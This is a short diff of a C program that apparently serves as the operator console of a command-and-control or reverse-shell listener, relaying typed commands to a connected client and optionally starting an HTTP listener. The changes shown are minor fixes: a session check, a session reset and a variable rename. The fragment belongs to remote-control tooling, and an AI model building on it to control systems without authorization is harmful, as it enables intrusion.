@@ -62,7 +62,7 @@ int main() {
             char *executed;
 
             //check if operator want start HTTP listener
-            if (strcmp(input, "http") == 0) {
+            if (strcmp(input, "http") == 0 && session == 0) {
                 //preparing listener
                 puts("Preparing HTTP listener");
                 http_listener_accept = http_listener(http_listener_socket);
@@ -101,8 +101,10 @@ int main() {
                     error("Error sending to client");
                 printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
-            
             }
+            //restore session to initial
+            session = 0;
+
             //sending to client
             printf("Sending to client: %s\n", input);
             if (send(inferno_accept, input, sizeof(input), 0) == -1)
@@ -139,11 +141,11 @@ int http_listener(int http_listener_socket) {
     printf("HTTP listener initialized\n");
     
     //reuse http
-    int reuse = 1;
-    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) == -1)
+    int reuse_http = 1;
+    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEADDR, &reuse_http, sizeof(reuse_http)) == -1)
         error("Error reusing http address");
 
-    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse)) == -1)
+    if (setsockopt(http_listener_socket, SOL_SOCKET, SO_REUSEPORT, &reuse_http, sizeof(reuse_http)) == -1)
         perror("Error reusing http port");
 
     //bind http
